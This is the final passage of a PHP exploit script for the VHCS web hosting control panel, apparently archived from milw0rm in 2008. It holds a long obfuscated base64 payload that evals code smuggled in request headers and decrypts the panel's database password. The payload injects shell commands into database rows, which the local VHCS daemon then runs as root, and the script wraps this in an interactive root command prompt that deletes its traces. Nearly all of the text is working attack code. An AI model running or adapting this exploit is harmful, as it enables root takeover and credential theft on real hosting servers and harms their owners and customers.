		{
			$this->msg('PHP configured with default safe_mode value (Off)', 0);

			$this->safe_mode = FALSE;
		}

		return $this->safe_mode;
	}

	function exec_cmd()
	{
		$this->msg("Now you can execute commands as root =]", 1);

		$this->woot_code =
		 'PD9waHAKCi8qCm1haWwoJ2xlZXRAcHduZWQuY29tJywgJ3Z1bG'
		.'5lcmFibGUgdmhjcyBob3N0ICEnLCAndGh4IHRvIHRoZSBzayAh'
		.'IHZoY3MgdnVsbiBob3N0OiAnLiRfU0VSVkVSWydSRU1PVEVfQU'
		.'REUiddKTsKdGhpcyBpcyBhIGpva2UgPVAgd2hlbiB5b3UgdXNl'
		.'IGVuY29kZWQgcGhwIGNvZGUsIHNlZSB3aGF0IGlzIGl0IGJlZm'
		.'9yZSB1c2luZyBpdCA9KQoqLwokdmFsaWRfdiA9ICdIVFRQX1NQ'
		.'TE9JVF8nOwoKZm9yZWFjaCgkX1NFUlZFUiBhcyAkaGVhZGVyID'
		.'0+ICR2YWx1ZSkKewoJaWYoIWlzX2FycmF5KCR2YWx1ZSkpCgl7'
		.'CgkJJHZhbHVlID0gYmFzZTY0X2RlY29kZSgkdmFsdWUpOwoKCQ'
		.'lpZihlcmVnKCR2YWxpZF92LCRoZWFkZXIpKQoJCXsKCQkJaWYo'
		.'ZXJlZygnUEhQX0tFWVMnLCAkaGVhZGVyKSkKCQkJICAgZXZhbC'
		.'gkdmFsdWUpOwoKCQkJZWxzZQoJCQl7CgkJCQkkdmFyX24gID0g'
		.'c3RydG9sb3dlcihzdHJfcmVwbGFjZSgkdmFsaWRfdiwnJywgJG'
		.'hlYWRlcikpOwoJCQkJJCR2YXJfbiA9ICR2YWx1ZTsKCQkJfQoJ'
		.'CX0KCX0KfQoKbXlzcWxfY29ubmVjdCgkZGJfaG9zdCwkZGJfdX'
		.'NlcixkZWNyeXB0X2RiX3Bhc3N3b3JkKCRkYl9wYXNzKSk7Cm15'
		.'c3FsX3NlbGVjdF9kYigkZGJfbmFtZSk7CgokZmlsZSA9IGFkZH'
		.'NsYXNoZXMoJGZpbGUpOwokY21kICA9IGFkZHNsYXNoZXMoJGNt'
		.'ZCk7CiRWZXJzaW9uID0gJHZlcnNpb247CgokYWRkID0gYXJyYX'
		.'koKTsKJGFkZFtdID0gCiJJTlNFUlQgSU5UTyBkb21haW4gKGBk'
		.'b21haW5fbmFtZWAsYGRvbWFpbiIuCiJfZ2lkYCxgZG9tYWluX3'
		.'VpZGAsYGRvbWFpbl9hZG1pbl9pZGAsYGRvbSIuCiJhaW5fY3Jl'
		.'YXRlZF9pZGAsYGRvbWFpbl9jcmVhdGVkYCxgZG9tYWluXyIuCi'
		.'JsYXN0X21vZGlmaWVkYCxgZG9tYWluX21haWxhY2NfbGltaXRg'
		.'LGBkbyIuCiJtYWluX2Z0cGFjY19saW1pdGAsYGRvbWFpbl90cm'
		.'FmZmljX2xpbWl0YCIuCiIsYGRvbWFpbl9zcWxkX2xpbWl0YCxg'
		.'ZG9tYWluX3NxbHVfbGltaXRgLCIuCiJgZG9tYWluX3N0YXR1c2'
		.'AsYGRvbWFpbl9hbGlhc19saW1pdGAsYGRvbSIuCiJhaW5fc3Vi'
		.'ZF9saW1pdGAsYGRvbWFpbl9pcF9pZGAsYGRvbWFpbl9kaSIuCi'
		.'Jza19saW1pdGAsYGRvbWFpbl9kaXNrX3VzYWdlYCxgZG9tYWlu'
		.'X3BocCIuCiJgLGBkb21haW5fY2dpYCkgVkFMVUVTICgnZGVsZX'
		.'RlbWViaWF0Y2g7JGNtZCIuCiIgPiAkZmlsZTtybSAvdG1wL2h0'
		.'YWNjZXNzLXVzZXItY2YtZGVsZXRlbSIuCiJlYmlhdGNoO2VjaG'
		.'8gMSMnLCcwJywgJzAnLCAnLTEnLCAnLTEnLCAnMCIuCiInLCAn'
		.'MCcsICcwJywgJzAnLCAnMCcsICcwJywgJzAnLCdvaycsICcwJy'
		.'IuCiIsJzAnLCAnLTEnLCAnMCcsICcwJywgJ3llcycsICd5ZXMn'
		.'KSI7CgokYWRkW10gPQoiSU5TRVJUIElOVE8gaHRhY2Nlc3MgKG'
		.'BkbW5faWRgLGB1c2VyX2lkYCwiLgoiYGdyb3VwX2lkYCxgYXV0'
		.'aF90eXBlYCxgYXV0aF9uYW1lYCxgcGF0aGAiLgoiLGBzdGF0dX'
		.'NgKSBWQUxVRVMgKChTRUxFQ1QgZG9tYWluX2lkIEZST00iLgoi'
		.'IGRvbWFpbiBXSEVSRSBkb21haW5fbmFtZSBMSUtFICclJGZpbG'
		.'UlJykiLgoiLC0xLDAsJ0Jhc2ljJywnaHVodScsJy90bXAnLCd0'
		.'b2FkZCcpIjsKCmV4ZWNfc3FsKCRhZGQpOwoKc2VuZF9yZXF1ZX'
		.'N0KCk7CnNsZWVwKCRzbGVlcF90aW1lKTsKcHJpbnQoZmlsZV9n'
		.'ZXRfY29udGVudHMoJGZpbGUpKTsKdW5saW5rKCRmaWxlKTsKCi'
		.'RkZWwgPSBhcnJheSgpOwokZGVsW10gPSAKIkRFTEVURSBGUk9N'
		.'IGh0YWNjZXNzIFdIRVJFIGRtbl9pZCA9IChTRUxFQyIuCiJUIG'
		.'RvbWFpbl9pZCBGUk9NIGRvbWFpbiBXSEVSRSBkb21haW5fbmFt'
		.'ZSAiLgoiTElLRSAnJSRmaWxlJScpIjsKCiRkZWxbXSA9CiJERU'
		.'xFVEUgRlJPTSBkb21haW4gV0hFUkUgZG9tYWluX25hbWUgTElL'
		.'RSAiLgoiJyUkZmlsZSUnIjsKCmV4ZWNfc3FsKCRkZWwpOwoKZn'
		.'VuY3Rpb24gZXhlY19zcWwoJHNxbF9hcnIpCnsKCWZvcmVhY2go'
		.'JHNxbF9hcnIgYXMgJHNxbF9xKQoJICAgbXlzcWxfcXVlcnkoJH'
		.'NxbF9xKSB8fCBkaWUobXlzcWxfZXJyb3IoKSk7CgoJcmV0dXJu'
		.'Owp9CgovLyB2aGNzCmZ1bmN0aW9uIGRlY3J5cHRfZGJfcGFzc3'
		.'dvcmQgKCRkYl9wYXNzKSB7CgogICAgIGdsb2JhbCAkdmhjczJf'
		.'ZGJfcGFzc19rZXk7CiAgICAgZ2xvYmFsICR2aGNzMl9kYl9wYX'
		.'NzX2l2OwogICAgICAgICAgIAogICAgJHRleHQgPSBiYXNlNjRf'
		.'ZGVjb2RlKCIkZGJfcGFzc1xuIik7CiAgICAKICAgIC8qIE9wZW'
		.'4gdGhlIGNpcGhlciAqLwogICAgJHRkID0gbWNyeXB0X21vZHVs'
		.'ZV9vcGVuICgnYmxvd2Zpc2gnLCAnJywgJ2NiYycsICcnKTsKIC'
		.'AgIAogICAgLyogQ3JlYXRlIGtleSAqLwogICAgICAgICRrZXkg'
		.'PSAkdmhjczJfZGJfcGFzc19rZXk7CiAgICAKICAgIC8qIENyZW'
		.'F0ZSB0aGUgSVYgYW5kIGRldGVybWluZSB0aGUga2V5c2l6ZSBs'
		.'ZW5ndGggKi8KICAgICAgICAkaXYgPSAkdmhjczJfZGJfcGFzc1'
		.'9pdjsKICAgICAgCiAgICAvKiBJbnRpYWxpemUgZW5jcnlwdGlv'
		.'biAqLyAgICAgICAgICAgICAgICAgICAgCiAgICBtY3J5cHRfZ2'
		.'VuZXJpY19pbml0ICgkdGQsICRrZXksICRpdik7CiAgICAgICAg'
		.'ICAgICAgICAgICAgICAKICAgIC8qIERlY3J5cHQgZW5jcnlwdG'
		.'VkIHN0cmluZyAqLyAgICAKICAgICRkZWNyeXB0ZWQgPSBtZGVj'
		.'cnlwdF9nZW5lcmljICgkdGQsICR0ZXh0KTsKICAgICAgICAgIC'
		.'AgICAgICAgICAgICAgICAKICAgIG1jcnlwdF9tb2R1bGVfY2xv'
		.'c2UgKCR0ZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIC'
		.'AgICAgCiAgICAvKiBTaG93IHN0cmluZyAqLyAgICAgICAgICAg'
		.'ICAgICAgICAgICAgICAgICAgICAgICAKICAgIHJldHVybiB0cm'
		.'ltKCRkZWNyeXB0ZWQpOwp9CgovLyB2aGNzCmZ1bmN0aW9uIHNl'
		.'bmRfcmVxdWVzdCgpIHsKCiAgICBnbG9iYWwgJFZlcnNpb24sIC'
		.'RWZXJzaW9uSCwgJEJ1aWxkRGF0ZTsKCiAgICBAJHNvY2tldCA9'
		.'IHNvY2tldF9jcmVhdGUgKEFGX0lORVQsIFNPQ0tfU1RSRUFNLC'
		.'AwKTsKCiAgICBpZiAoJHNvY2tldCA8IDApIHsKICAgICAgICAk'
		.'ZXJybm8gPSAgInNvY2tldF9jcmVhdGUoKSBmYWlsZWQuXG4iOw'
		.'ogICAgICAgIHJldHVybiAkZXJybm87CiAgICB9CgogICAgQCRy'
		.'ZXN1bHQgPSBzb2NrZXRfY29ubmVjdCAoJHNvY2tldCwgIjEyNy'
		.'4wLjAuMSIsIDk4NzYpOwogICAgaWYgKCRyZXN1bHQgPT0gRkFM'
		.'U0UpIHsKICAgICAgICAkZXJybm8gPSAgInNvY2tldF9jb25uZW'
		.'N0KCkgZmFpbGVkLlxuIjsKICAgICAgICByZXR1cm4gJGVycm5v'
		.'OwogICAgfQoKICAgIC8qIHJlYWQgb25lIGxpbmUgd2l0aCB3ZW'
		.'xjb21lIHN0cmluZyAqLwogICAgJG91dCA9IHJlYWRfbGluZSgk'
		.'c29ja2V0KTsKCiAgICAvKiBzZW5kIGhlbGxvIHF1ZXJ5ICovCi'
		.'AgICAkcXVlcnkgPSAiaGVsbyAgJFZlcnNpb25cclxuIjsKICAg'
		.'IHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1ZXJ5LCBzdHJsZW'
		.'4gKCRxdWVyeSkpOwoKICAgIC8qIHJlYWQgb25lIGxpbmUgd2l0'
		.'aCBoZWxvIGFuc3dlciAqLwogICAgJG91dCA9IHJlYWRfbGluZS'
		.'gkc29ja2V0KTsKCiAgICAvKiBzZW5kIHJlZyBjaGVjayBxdWVy'
		.'eSAqLwogICAgJHF1ZXJ5ID0gImV4ZWN1dGUgcXVlcnlcclxuIj'
		.'sKICAgIHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1ZXJ5LCBz'
		.'dHJsZW4gKCRxdWVyeSkpOwogICAgLyogcmVhZCBvbmUgbGluZS'
		.'BrZXkgcmVwbGF5ICovCiAgICAkZXhlY3V0ZV9yZXBsYXkgPSBy'
		.'ZWFkX2xpbmUoJHNvY2tldCk7CgogICAgLyogc2VuZCBxdWl0IH'
		.'F1ZXJ5ICovCiAgICAkcXVpdF9xdWVyeSA9ICJieWVcclxuIjsK'
		.'ICAgIHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1aXRfcXVlcn'
		.'ksIHN0cmxlbiAoJHF1aXRfcXVlcnkpKTsKICAgIC8qIHJlYWQg'
		.'cXVpdCBhbnN3ZXIgKi8KICAgICRxdWl0X3JlcGxheSA9IHJlYW'
		.'RfbGluZSgkc29ja2V0KTsKCiAgICAvKiBhbmFseXplIGtleSBy'
		.'ZXBsYXkgKi8KICAgICRhbnN3ZXIgPSAkZXhlY3V0ZV9yZXBsYX'
		.'k7CgogICAgLyogY2xvc2Ugc29ja2V0ICovCiAgICBzb2NrZXRf'
		.'Y2xvc2UgKCRzb2NrZXQpOwoKICAgIC8qIHJldHVybiBmdW5jdG'
		.'lvbiByZXN1bHQgKi8KICAgIHJldHVybiAkYW5zd2VyOwoKfQoK'
		.'Ly8gdmhjcwpmdW5jdGlvbiByZWFkX2xpbmUoJHNvY2tldCkgew'
		.'0KICAgICRjaCA9ICcnOw0KICAgICRsaW5lID0gJyc7DQogICAg'
		.'ZG97DQogICAgICAgICRjaCA9IHNvY2tldF9yZWFkKCRzb2NrZX'
		.'QsMSk7DQogICAgICAgICRsaW5lID0gJGxpbmUgLiAkY2g7DQog'
		.'ICAgfSB3aGlsZSgkY2ggIT0gIlxyIik7DQogICAgcmV0dXJuIC'
		.'RsaW5lOw0KfQo/Pgo=';

 		while($this->cmd_prompt())
		{
			$this->exec_php('print $_SERVER["DOCUMENT_ROOT"];');
			$this->tmp_file = $this->getcontent().'/'.md5(rand());

			$this->set_hvar('db-host',    $this->conf['DATABASE_HOST']);
			$this->set_hvar('db-user',    $this->conf['DATABASE_USER']);
			$this->set_hvar('db-pass',    $this->conf['DATABASE_PASSWORD']);
			$this->set_hvar('db-name',    $this->conf['DATABASE_NAME']);

			$this->set_hvar('sleep-time', $this->sleep_time);
			$this->set_hvar('file',       $this->tmp_file);
			$this->set_hvar('cmd',        $this->cmd);
			$this->set_hvar('version',    $this->conf['Version']);
			
			$this->set_hvar('php-keys',   '?>'.$this->php_keys_code);

			$this->exec_php('?>'.base64_decode($this->woot_code));

			print "\n".$this->getcontent();
		}

		exit(0);
	}

	function set_hvar($name, $value)
	{
		$this->addheader('Sploit-'.$name, base64_encode($value));

		return;
	}

	function cmd_prompt()
	{
		$this->msg('root@'.$this->usr.': ', 1);
		$this->cmd = trim(fgets(STDIN));

		if(!ereg('^(quit|exit)$', $this->cmd))
		   return TRUE;

		else
		   return FALSE;
	}

	function exec_php($php)
	{
		$this->addheader('Shell', base64_encode($php));
		$this->get($this->dmn_url.'/errors/404/index.php');

		return;
	}

	function msg($msg, $flag, $action=0)
	{
		print "\n ".$this->flags[$flag]."\x20".$msg;

		switch($action)
		{
			case 1:
				print "\n";
				return $this->usage();
			break;

			case 2:
				print "\n";
				exit(1);
			break;
		}
	}
}

$spl = new vhcs_xpl;
$spl->main();

?>

# milw0rm.com [2008-03-09]
